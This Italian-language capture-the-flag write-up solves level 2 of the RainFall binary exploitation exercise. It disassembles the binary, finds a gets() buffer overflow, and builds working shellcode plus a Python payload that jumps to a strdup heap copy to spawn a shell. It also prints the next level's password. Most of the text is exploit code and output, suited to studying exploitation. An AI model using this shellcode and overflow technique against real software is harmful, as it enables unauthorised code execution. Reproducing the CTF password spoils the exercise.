# Level 2

Come prima cosa analizzo le stringhe presenti nell'eseguibile:
```
level2@RainFall:~$ readelf -p '.rodata' level2

String dump of section '.rodata':
  [     8]  (%p)^J
```
ma non trovo nulla di interessante, dunque passo ad analizzare tramite `gdb`:
```
level2@RainFall:~$ gdb -q level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  gets
0x080483c0  gets@plt
0x080483d0  _exit
0x080483d0  _exit@plt
0x080483e0  strdup
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p
0x0804853f  main
0x08048550  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c2  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
(gdb) disass main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
(gdb) disass p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```
Troviamo due funzioni collegate, ovvero `main` e `p`.

`main` che si occupa solo della chiamata alla funzione `p`, mentre quest'ultima
contiene la chiamata a `gets`, quindi vulnerabile.
Altro aspetto importante è il seguente codice:
```
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
```
il quale controlla se l'indirizzo di ritorno è presente nello stack o meno,
dunque non possiamo inserire uno shellcode nello stack, ma per fortuna 
l'input inserito dall'utente viene poi passato alla funzione `strdup` la quale
inserisce l'input nell'heap, ed è proprio ciò che sfrutteremo, poichè osservando
il comando `ltrace` notiamo che l'indirizzo di ritorno è sempre uguale:
```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                         = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5usavoia
)                              = 0xbffff6fc
puts("usavoia"usavoia
)                                                            = 8
strdup("usavoia")                                                          = 0x0804a008
+++ exited (status 8) +++
```
Quindi ora non resta che trovare l'offset dell'indirizzo contenuto in `eip` tramite
il sito [Buffer Overflow EIP Offset String Generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
inserendo un massimo di 104 caratteri che corrisponde allo spazio riservato nello stack
per la funzione `p`:
```
level2@RainFall:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad" > /tmp/exploit1
level2@RainFall:~$ gdb -q level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) r < /tmp/exploit1
Starting program: /home/user/level2/level2 < /tmp/exploit1
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
Abbiamo un offset di 80 byte, quindi bisogna scrivere uno shellcode che rientri
in 80 byte per poi aggiungere i 4 byte dell'indirizzo di strdup `0x0804a008`

Shellcode (Assembly):
```asm
section .text
global _start

_start:
  xor  eax, eax
  push eax
  push 0x68732f2f
  push 0x6e69622f
  mov  ebx, esp
  push eax
  push ebx
  mov  ecx, esp
  xor  edx, edx
  mov  al, 11
  and  esp, 0xfffffff0
  int  0x80
```
Shellcode (Opcode):
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80
```
Ora bisogna creare una stringa che contenga i 28 byte dello shellcode più 52 byte
di spazzatura più 4 byte per l'indirizzo restituito da strdup, così che `eip`
salterà nell'heap agli opcode memorizzati dalla copia effettuata da strdup e verranno
eseguiti normalmente, avviando una shell:

```
level2@RainFall:~$ python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80" + "a"*52 + "\x08\xa0\x04\x08"' > /tmp/exploit
level2@RainFall:~$ cat /tmp/exploit - | ./level2
1�Ph//shh/bin��PS��1Ұ
                     ���̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�aaaaaaaaaaa�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
```
level2@RainFall:~$ su level3
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
level3@RainFall:~$
```